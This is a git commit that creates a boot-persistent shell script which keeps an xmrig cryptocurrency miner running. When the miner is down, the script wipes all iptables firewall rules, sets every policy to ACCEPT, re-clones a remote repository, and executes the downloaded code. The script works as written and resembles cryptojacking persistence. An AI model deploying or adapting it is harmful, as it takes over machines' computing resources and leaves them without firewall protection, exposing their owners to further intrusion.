baca73cf247eb2d2b41c5c74d40811ef17797ead
legevole <54764450+legevole@users.noreply.github.com>
2021-02-25 03:19:21 +0200

    Create autorun.bash

---
+++ autorun.bash
@@ -0,0 +1,28 @@
+#!/bin/sh
+#mv autorun.bash to /etc/init.d/ #update-rc.d autorun.bash defaults
+# run it$ bash autorun.bash & disown
+timeout=7200
+while true
+do
+iip=$(dig +short myip.opendns.com @resolver1.opendns.com | sed -e "s/[.]/-/g")
+if [[ ! $(pgrep xmrig) ]]; then
+cd /usr/local/loki/
+screen -S work -d -m bash -c "./auto"
+sleep 15
+if [[ ! $(pgrep xmrig) ]]; then
+cd /usr/local/
+iptables -P INPUT ACCEPT
+iptables -P OUTPUT ACCEPT
+iptables -P FORWARD ACCEPT
+iptables -F
+service iptables save
+rm -rf loki/
+git clone https://github.com/legevole/loki.git
+cd loki/
+awk '$1=$1' FS="#" OFS="$iip" config >>config.json
+chmod +x auto
+screen -S work -d -m bash -c "./auto"
+fi
+fi
+sleep $timeout
+done
